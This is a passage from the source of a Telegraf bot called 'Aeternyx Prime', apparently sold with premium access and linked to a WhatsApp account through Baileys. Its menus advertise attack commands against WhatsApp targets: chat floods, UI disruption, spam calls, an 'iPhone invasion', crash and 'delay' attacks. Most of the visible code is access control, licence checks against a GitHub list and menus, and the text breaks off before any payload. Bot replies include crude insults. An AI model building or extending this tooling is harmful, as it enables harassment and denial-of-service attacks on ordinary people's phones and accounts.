const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const os = require('os');
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const crypto = require("crypto");
const DATABASE_DIR = path.join(__dirname, "データベース"); // folder データベース
const premiumFile = path.join(DATABASE_DIR, "premiumuser.json");
const adminFile = path.join(DATABASE_DIR, "adminuser.json");
const TOKENS_FILE = "./tokens.json";
let bots = [];
const { BOT_TOKEN, OWNER_ID } = require("./設定/config");
const imgCrL = fs.readFileSync('./メディア/ImgCrl.png');
const filePath = path.join(
  DATABASE_DIR,
  "安全",
  "ライセンスキー.json"
);

const { LICENSE_KEY } = JSON.parse(fs.readFileSync(filePath, "utf-8"));
const bot = new Telegraf(BOT_TOKEN);

const speedFile = path.join(DATABASE_DIR, "speed.json");
const getGlobalDelay = () => {
  if (!fs.existsSync(speedFile)) return 1000;
  const data = JSON.parse(fs.readFileSync(speedFile));
  return data.delay || 1000;
};

const GROUP_ONLY_FILE = path.join(DATABASE_DIR, "grouponly.json");
let groupOnlyMode = false;

bot.use(session());

let Prime = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
  "https://files.catbox.moe/8va2ax.mp4",
  "https://files.catbox.moe/8va2ax.mp4"
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const days = Math.floor(uptimeSeconds / 86400);
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
  
const axios = require("axios");
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/Zexuar416/db_aeternyx/refs/heads/main/Aeternyx.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}      
const COOLDOWN_FILE = path.join(DATABASE_DIR, "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}

function isGroup(ctx) {
  ctx.reply("Bot ini hanya dapat digunakan di grup!");
  return ctx.chat.type === "group" || ctx.chat.type === "supergroup";
}

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  const value = parseInt(amount);

  switch (unit) {
    case "s":
      return value;
    case "m":
      return value * 60;
    default:
      return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

function loadGroupOnlyMode() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(GROUP_ONLY_FILE)) {
      const data = fs.readFileSync(GROUP_ONLY_FILE, "utf8");
      return JSON.parse(data).enabled || false;
    }
    return false;
  } catch (error) {
    console.error("Error loading group only mode:", error);
    return false;
  }
}

function saveGroupOnlyMode(enabled) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(GROUP_ONLY_FILE, JSON.stringify({ enabled }, null, 2));
    groupOnlyMode = enabled;
  } catch (error) {
    console.error("Error saving group only mode:", error);
  }
}

async function validateAccess() {
  console.log(chalk.blue("🔍 Validasi akses bot..."));

  try {
    const [tokensRes, keysRes, idsRes] = await Promise.all([
      axios.get("https://raw.githubusercontent.com/Zexuar416/db_aeternyx/main/Aeternyx.json"),
      axios.get("https://raw.githubusercontent.com/Zexuar416/db_aeternyx/main/keys.json"),
      axios.get("https://raw.githubusercontent.com/Zexuar416/db_aeternyx/main/ids.json"),
    ]);

    const tokens = tokensRes.data.tokens;
    const keys = keysRes.data.keys;
    const ids = idsRes.data.ids;

    const isValidToken = tokens.includes(BOT_TOKEN);
    const isValidKey = keys.includes(LICENSE_KEY);
    const isValidId = ids.includes(OWNER_ID.toString());

    if (!isValidToken || !isValidKey || !isValidId) {
      console.log(chalk.red(`
═════════════════════════════════════
⛔  AKSES DITOLAK - KONFIGURASI SALAH
- BOT_TOKEN  : ${isValidToken ? "✅ Valid" : "❌ Tidak Valid"}
- LICENSE_KEY: ${isValidKey ? "✅ Valid" : "❌ Tidak Valid"}
- OWNER_ID   : ${isValidId ? "✅ Valid" : "❌ Tidak Valid"}
═════════════════════════════════════
      `));
      process.exit(1);
    }

    console.log(chalk.green("✔️ Semua data valid, melanjutkan..."));
    startBot();

  } catch (err) {
    console.log(chalk.red("Gagal mengambil validasi akses dari GitHub!"));
    console.error(err.message);
    process.exit(1);
  }
}

function startBot() {
  console.log(chalk.green("🚀 Bot berhasil dijalankan!"));
  // Mulai logika bot kamu di sini
}

validateAccess();

// --- Koneksi WhatsApp ---
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./聴覚");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder, you can change this or remove it
    }),
  };

  Prime = makeWASocket(connectionOptions);

  Prime.ev.on("creds.update", saveCreds);

  Prime.ev.on("connection.update", (update) => {
  const { connection, lastDisconnect } = update;

  if (connection === "open") {
    isWhatsAppConnected = true;
    linkedWhatsAppNumber = Prime.user?.id?.split(":")[0] || "Tidak Diketahui";
    
    console.log(`
${chalk.greenBright('╭═════[')} ${chalk.green.bold('✓ TERHUBUNG')} ${chalk.greenBright(']═════╮')}
${chalk.greenBright('║')} ${chalk.greenBright('>> WhatsApp berhasil terhubung <<')}
${chalk.greenBright('║')}
${chalk.greenBright('║')} ${chalk.whiteBright('• Status koneksi:')} ${chalk.green('🟢 Online')}
${chalk.greenBright('║')} ${chalk.whiteBright('• Sesi aktif dan stabil')}
${chalk.greenBright('║')}
${chalk.greenBright('║')} ${chalk.cyan('>>')} ${chalk.white.bold('Siap menjalankan perintah')}
${chalk.greenBright('╰════════════════════════════════════════════╯')}
`);
  }

  if (connection === "close") {
    const shouldReconnect =
      lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

    console.log(`
${chalk.redBright('╭═════[')} ${chalk.red.bold('X TERPUTUS')} ${chalk.redBright(']═════╮')}
${chalk.redBright('║')} ${chalk.redBright('>> WhatsApp tidak terhubung <<')}
${chalk.redBright('║')}
${chalk.redBright('║')} ${chalk.whiteBright('• Sesi berakhir atau sinyal terputus')}
${chalk.redBright('║')} ${chalk.whiteBright('• Status koneksi:')} ${chalk.red('❌ Offline')}
${chalk.redBright('║')}
${chalk.redBright('║')} ${chalk.cyan('>>')} ${chalk.white.bold('Menghubungkan ulang...')}
${chalk.redBright('╰════════════════════════════════════════════╯')}
`);

    if (shouldReconnect) {
      startSesi(); // atau fungsi reconnect kamu
    }
    isWhatsAppConnected = false;
  }
});
};

const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = OWNER_ID;
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// ====================== Access Validator Middleware ======================
function accessControl(ctx, next) {
  if (!ctx.message || !ctx.message.text) return next();
  const command = ctx.message.text.split(" ")[0].replace("/", "");
  const userId = ctx.from.id.toString();
  const access = loadCommandAccess();
  const isOwner = ownerUsers.includes(userId);
  const isPremium = premiumUsers.includes(userId);

  if (access.owneronly.includes(command) && !isOwner) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  if (access.premiumonly.includes(command) && !isOwner && !isPremium) {
    return ctx.reply("❌ Perintah ini hanya untuk pengguna premium.");
  }

  return next();
}

bot.use(accessControl);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Lu siapa? Lu bukan owner anjing kontol bangsat...");
  }
  next();
};
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("Add Premium Dlu Kntl🤓...");
  }
  next();
};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("💢 WhatsApp belum terhubung njirr, pairing dulu lah, /addsender...");
    return;
  }
  next();
};

bot.command("premiumonly", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1];
  if (!cmd) return ctx.reply("⚠️ Contoh: /premiumonly strike");

  const access = loadCommandAccess();

  // Jika cmd sudah ada di owneronly, hapus dari sana
  if (access.owneronly.includes(cmd)) {
    access.owneronly = access.owneronly.filter(c => c !== cmd);
  }

  // Tambahkan ke premiumonly jika belum ada
  if (!access.premiumonly.includes(cmd)) {
    access.premiumonly.push(cmd);
  }

  saveCommandAccess(access);
  return ctx.reply(`✅ Command /${cmd} sekarang hanya untuk premium.`);
});

bot.command("owneronly", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1];
  if (!cmd) return ctx.reply("⚠️ Contoh: /owneronly addsender");

  const access = loadCommandAccess();

  // Jika cmd sudah ada di premiumonly, hapus dari sana
  if (access.premiumonly.includes(cmd)) {
    access.premiumonly = access.premiumonly.filter(c => c !== cmd);
  }

  // Tambahkan ke owneronly jika belum ada
  if (!access.owneronly.includes(cmd)) {
    access.owneronly.push(cmd);
  }

  saveCommandAccess(access);
  return ctx.reply(`✅ Command /${cmd} sekarang hanya untuk owner.`);
});

const waktu = require("moment-timezone");
require("moment/locale/id");
waktu.tz.setDefault("Asia/Jakarta");
waktu.locale("id");

// Fungsi log pesan
function logPesanAeternyx(ctx) {
const username = ctx.from?.username;
  const fallbackName = ctx.from?.first_name || 'Unknown';
  const dari = username ? `@${username}` : fallbackName;
  const chatId = ctx.chat?.id || 'Unknown';
  const chatType = ctx.chat?.type || 'Unknown';
  const chatTitle = ctx.chat?.title || null;
  const groupUsername = ctx.chat?.username ? `@${ctx.chat.username}` : null;
  const pesan = ctx.message?.text || '';
  const sekarang = waktu().format("dddd, DD MMMM YYYY HH:mm:ss");

  const pesanBaris = pesan.split('\n');
  const prefix = chalk.green(`│ Pesan     : `);
  const spacer = ' '.repeat(prefix.length);

  console.log(chalk.cyan.bold("╭────────────────────────────────────────────╮"));
  console.log(chalk.magenta.bold("│          Aeternyx Prime Activition         │"));
  console.log(chalk.cyan.bold("├────────────────────────────────────────────┤"));
  console.log(chalk.green(`│ Waktu     : `) + chalk.blue(`${sekarang}`));
  console.log(chalk.green(`│ Dari      : `) + chalk.yellow(`${dari}`));
  console.log(chalk.green(`│ Chat ID   : `) + chalk.magenta(`${chatId}`));
  console.log(chalk.green(`│ Chat Type : `) + chalk.blue(`${chatType}`));

  if (chatType === 'group' || chatType === 'supergroup') {
    console.log(chalk.green(`│ Group Name : `) + chalk.cyan(`${chatTitle || 'Tidak diketahui'}`));
    if (groupUsername) {
      console.log(chalk.green(`│ Username Group : `) + chalk.cyan(`${groupUsername}`));
    }
  }

  pesanBaris.forEach((baris, index) => {
    const linePrefix = index === 0 ? prefix : spacer;
    console.log(linePrefix + chalk.magenta(baris));
  });

  console.log(chalk.cyan.bold("╰────────────────────────────────────────────╯\n"));
}

// Middleware global untuk log semua pesan termasuk command
bot.use(async (ctx, next) => {
  if (ctx.message && ctx.message.text) {
    logPesanAeternyx(ctx);
  }
  await next();
});

bot.start(async (ctx) => {
  // Batasi akses hanya di grup jika mode aktif
  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }

  try {
    const userId = ctx.from.id.toString();
    const firstname = ctx.from.first_name;
    const isPremium = premiumUsers.includes(userId);
    const Name = ctx.from.username ? `@${ctx.from.username}` : firstname;
    const now = new Date();
    const waktuRunPanel = getUptime();

    const waktu = new Intl.DateTimeFormat('id-ID', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
      timeZone: 'Asia/Jakarta',
    }).format(now);

    const hari = new Intl.DateTimeFormat('id-ID', {
      weekday: 'long',
      timeZone: 'Asia/Jakarta',
    }).format(now);

    const tanggalLengkap = new Intl.DateTimeFormat('id-ID', {
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      timeZone: 'Asia/Jakarta',
    }).format(now);

    const fallbackKeyboard = {
      inline_keyboard: [
        [
          { text: "⚡️ Buy Access", url: "https://t.me/biyalue2" },
          { text: "✧ Information Script", url: "https://t.me/AeternyxPrime" },
        ],
      ],
    };

    if (!isPremium) {
      return ctx.replyWithAnimation(getRandomImage(), {
        caption: `\`\`\`Aeternyx-Prime\nLU SIAPA? BUY ACCESS KE DEV AKU AJA NI JAN LUPA MASUK KE CH DEV🤓🐉\`\`\``,
        parse_mode: "Markdown",
        reply_markup: fallbackKeyboard,
      });
    }

    const mainMenuMessage = `\`\`\`⏤͟͟͞͞𝙰𝙴𝚃𝙴𝚁𝙽𝚈𝚇-𝙿𝚁𝙸𝙼𝙴
 ( 🐉 ) Hi I am Aeternyx version 1.1 and my creator is @biyalue2 please use me as best as you can.

  『 © 𝙰𝙴𝚃𝙴𝚁𝙽𝚈𝚇 ⌁ 𝙿𝚁𝙸𝙼𝙴 © 』
 ⟐ Author      : @biyalue2
 ⟐ Version    : 1.1
 ⟐ Runtime    : ${waktuRunPanel}
 ⟐ Sender     : ${isWhatsAppConnected ? "1/1 Connected" : "0/1 Connected"}
 ⟐ Date       : ${hari}, ${tanggalLengkap}, ${waktu}

  『 ⌬ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝚄𝚂𝙴𝚁 ⌬ 』
 ⟐ Username   : ${Name}
 ⟐ User Id: ${userId}
 ⟐ Status     : ★ Premium User

( 🍁 ) PRESS A BUTTON TO EXECUTE\`\`\``;

    const mainKeyboard = [
      [
        { text: "𝙾𝚆𝙽𝙴𝚁 ⌁ 𝙼𝙴𝙽𝚄", callback_data: "owner_menu" },
        { text: "𝙱𝚄𝙶 ⌁ 𝙼𝙴𝙽𝚄", callback_data: "bug_menu" },
      ],
      [
        { text: "𝚃𝙷𝙰𝙽𝙺𝚂 ⌁ 𝚃𝙾͛", callback_data: "thanks" },
        { text: "𝚃𝙾𝙾𝙻𝚂 ⌁ 𝙼𝙴𝙽𝚄", callback_data: "tools_menu" },
      ],
    ];

    await ctx.replyWithAnimation(getRandomImage(), {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard,
      },
    });
  } catch (err) {
    console.error("Error in /start:", err);
    await ctx.reply("⚠️ Terjadi kesalahan saat memulai.");
  }
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();
  const userId = ctx.from.id;
  const isPremium = premiumUsers.includes(ctx.from.id.toString()) ? '★ Premium User' : 'Free User';
  const mainMenuMessage = `\`\`\`
  『 ⌬ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝚄𝚂𝙴𝚁 ⌬ 』
 ⟐ Username   : ${Name} 
 ⟐ User Id : ${userId} 
 ⟐ Status     : ${isPremium}
 ⟐ RunTime : ${waktuRunPanel}

  『 ✧ 𝙾𝚆𝙽𝙴𝚁 ⌁ 𝙼𝙴𝙽𝚄 ✧ 』
 ⟿ /addsender 62xxx  » Connect To Bot
 ⟿ /addprem <ID>    » Add Premium Access
 ⟿ /delprem <ID>    » Revoke Premium
 ⟿ /addadmin <ID>   » Add Bot Admin
 ⟿ /deladmin <ID>   » Remove Bot Admin
 ⟿ /delsesi          » Terminate Session
 ⟿ /listprem         » View Premium Users
 ⟿ /listadmin        » View Admin Users
\`\`\``;

  const media = {
    type: "animation",
    media: getRandomImage(), // Gambar acak
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "𝙼𝙰𝙸𝙽 ⌁ 𝙼𝙴𝙽𝚄", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithAnimation(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();
  const userId = ctx.from.id;
  const isPremium = premiumUsers.includes(ctx.from.id.toString()) ? '★ Premium User' : 'Free User';
  const mainMenuMessage = `\`\`\`
  『 ⌬ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝚄𝚂𝙴𝚁 ⌬ 』
 ⟐ Username   : ${Name} 
 ⟐ User Id: ${userId} 
 ⟐ Status     : ${isPremium}
 ⟐ RunTime : ${waktuRunPanel}

  『 ✦ 𝙱𝚄𝙶 ⌁ 𝙼𝙴𝙽𝚄 [Non Invisible] ✦ 』
 ⟿ /prime       » Chat Floods + UI Disrupt
 ⟿ /spamui     » Spam Ui
 ⟿ /spam_call   » Spam Call To Target
 ⟿ /blackout   » Invasion Iphone

  『 ✦ 𝙱𝚄𝙶 ⌁ 𝙼𝙴𝙽𝚄 [Invisible] ✦ 』
 ⟿ /blood       » Delay Infinity
 ⟿ /storm      » Silent Storm Duration
 ⟿ /overload    » Hard Delay Attack
 ⟿ /glacier     » Album Delay 
 ⟿ /strike      » Crash Method While
 ⟿ /blossomwave  » Multi Target
\`\`\``;

  const media = {
    type: "animation",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "𝙼𝙰𝙸𝙽 ⌁ 𝙼𝙴𝙽𝚄", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithAnimation(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk thanks to
bot.action("thanks", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();
  const userId = ctx.from.id;
  const isPremium = premiumUsers.includes(ctx.from.id.toString()) ? '★ Premium User' : 'Free User';
  const mainMenuMessage = `\`\`\`
  『 ⌬ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝚄𝚂𝙴𝚁 ⌬ 』
 ⟐ Username   : ${Name} 
 ⟐ User Id : ${userId} 
 ⟐ Status     : ${isPremium}
 ⟐ RunTime : ${waktuRunPanel}

  『 ✧ 𝚃𝙷𝙰𝙽𝙺𝚂 ⌁ 𝚃𝙾 ✧ 』
 ⟐ Allah         » My God
 ⟐ ErenXyrine   » My Teacher & Guide
 ⟐ Sonnoffc      » Teacher  
 ⟐ NovaXyiro     » Loyal Friend  
 ⟐ Asep          » My Friend  
 ⟐ Qud           » The Developer
\`\`\``;

  const media = {
    type: "animation",
    media: getRandomImage(), // Gambar acak
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "𝙼𝙰𝙸𝙽 ⌁ 𝙼𝙴𝙽𝚄", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithAnimation(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("tools_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();
  const userId = ctx.from.id;
  const isPremium = premiumUsers.includes(ctx.from.id.toString()) ? '★ Premium User' : 'Free User';
  const mainMenuMessage = `\`\`\`
  『 ⌬ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝚄𝚂𝙴𝚁 ⌬ 』
 ⟐ Username   : ${Name} 
 ⟐ User Id : ${userId} 
 ⟐ Status     : ${isPremium}
 ⟐ RunTime : ${waktuRunPanel}

  『 ✧ 𝚃𝙾𝙾𝙻𝚂 ⌁ 𝙼𝙴𝙽𝚄 ✧ 』
 ⟿ /setspeed <time> » Set Global Delay 
 ⟿ /premiumonly <cmd> » Limit Access
 ⟿ /owneronly <cmd> » Limit Access
 ⟿ /setcd <10m>     » Set Delay Duration
 ⟿ /grouponly <on/off> » Group Mode
 ⟿ /status            » Get Info Sender
 ⟿ /info            » Get info User
\`\`\``;

  const media = {
    type: "animation",
    media: getRandomImage(), // Gambar acak
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "𝙼𝙰𝙸𝙽 ⌁ 𝙼𝙴𝙽𝚄", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithAnimation(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const now = new Date();

const waktu = new Intl.DateTimeFormat('id-ID', {
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit',
  hour12: true,
  timeZone: 'Asia/Jakarta'
}).format(now);

const hari = new Intl.DateTimeFormat('id-ID', {
  weekday: 'long',
  timeZone: 'Asia/Jakarta'
}).format(now);

const tanggalLengkap = new Intl.DateTimeFormat('id-ID', {
  year: 'numeric',
  month: 'long',
  day: 'numeric',
  timeZone: 'Asia/Jakarta'
}).format(now);
 
  const mainMenuMessage = `\`\`\`⏤͟͟͞͞𝙰𝙴𝚃𝙴𝚁𝙽𝚈𝚇-𝙿𝚁𝙸𝙼𝙴
 ( 🐉 ) Hi I am aeternyx version 1.1 and my creator is @biyalue2 please use me as best as you can.

  『 © 𝙰𝙴𝚃𝙴𝚁𝙽𝚈𝚇 ⌁ 𝙿𝚁𝙸𝙼𝙴 © 』
 ⟐ Author        : @biyalue2
 ⟐ Version    : 1.1
 ⟐ Uptime      : ${waktuRunPanel}
 ⟐ Sender     : ${isWhatsAppConnected ? "1/1 Connected" : "0/1 Connected"}
 ⟐ Date   : ${hari}, ${tanggalLengkap}, ${waktu}

  『 ⌬ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝚄𝚂𝙴𝚁 ⌬ 』
 ⟐ Username   : ${Name}
 ⟐ User Id : ${userId}
 ⟐ Status     : ${isPremium ? "★ Premium User" : "Free User"}

  ( 🍁 ) PRESS A BUTTON TO EXECUTE\`\`\``;

  const media = {
    type: "animation",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const mainKeyboard = [
    [
      {
        text: "𝙾𝚆𝙽𝙴𝚁 ⌁ 𝙼𝙴𝙽𝚄",
        callback_data: "owner_menu",
      },
      {
        text: "𝙱𝚄𝙶 ⌁ 𝙼𝙴𝙽𝚄",
        callback_data: "bug_menu",
      },
    ],
    [
      {
        text: "𝚃𝙷𝙰𝙽𝙺𝚂 ⌁ 𝚃𝙾͛ ",
        callback_data: "thanks",
      },
      {
        text: "𝚃𝙾𝙾𝙻𝚂 ⌁ 𝙼𝙴𝙽𝚄",
        callback_data: "tools_menu",
      },
    ],
  ];

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithAnimation(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

bot.command("setcd", async (ctx) => {
  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }

  const args = ctx.message.text.split(" ");
  const userId = ctx.from.id.toString();
  const commandName = "setcd";
  const access = loadCommandAccess();

  if (access.owneronly.includes(commandName) && !ownerUsers.includes(userId)) {
    return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini");
  }

  if (
    access.premiumonly.includes(commandName) &&
    !premiumUsers.includes(userId) &&
    !ownerUsers.includes(userId)
  ) {
    return ctx.reply("❌ Maaf, hanya user premium yang bisa menggunakan perintah ini");
  }

  const duration = args[1] ? args[1].trim() : null;
  if (!duration) {
    return ctx.reply("❌ Masukin durasinya goblok!\nContoh: /setcd 60s atau /setcd 2m");
  }

  const seconds = parseCooldownDuration(duration);
  if (seconds === null) {
    return ctx.reply(
      `❌ Format salah bangsat!\nGunakan: /setcd <durasi>\nContoh: /setcd 60s atau /setcd 10m\n(s=detik, m=menit)`
    );
  }

  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime = seconds >= 60
    ? `${Math.floor(seconds / 60)} menit`
    : `${seconds} detik`;

  return ctx.reply(`✅ Cooldown global sudah diatur ke ${displayTime}`);
});


bot.command("grouponly", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = ctx.from.id.toString();
  const commandName = "grouponly";
  const access = loadCommandAccess();

  if (access.owneronly.includes(commandName) && !ownerUsers.includes(userId)) {
    return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini");
  }

  if (
    access.premiumonly.includes(commandName) &&
    !premiumUsers.includes(userId) &&
    !ownerUsers.includes(userId)
  ) {
    return ctx.reply("❌ Maaf, hanya user premium yang bisa menggunakan perintah ini");
  }

  const param = args[1] ? args[1].trim().toLowerCase() : null;
  if (!param || !["on", "off"].includes(param)) {
    return ctx.reply("❌ Salah Gblk\nContoh: /grouponly on");
  }

  try {
    const newStatus = param === "on";
    saveGroupOnlyMode(newStatus);
    return ctx.reply(`✅ Mode Group Only sekarang: ${newStatus ? "Aktif" : "Non-Aktif"}`);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Gagal mengubah status, ada error bang");
  }
});
//////// -- CASE BUG 1 --- \\\\\\\\\\\
bot.command("prime", checkWhatsAppConnection, async (ctx) => {
  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }

  const args = ctx.message.text.split(" ");
  const q = args[1];
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  const access = loadCommandAccess();
  const commandName = "prime";

  if (access.owneronly.includes(commandName) && !ownerUsers.includes(userId)) {
    return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini");
  }

  if (
    access.premiumonly.includes(commandName) &&
    !premiumUsers.includes(userId) &&
    !ownerUsers.includes(userId)
  ) {
    return ctx.reply("❌ Maaf, hanya user premium yang bisa menggunakan perintah ini");
  }
  
  if (!q) {
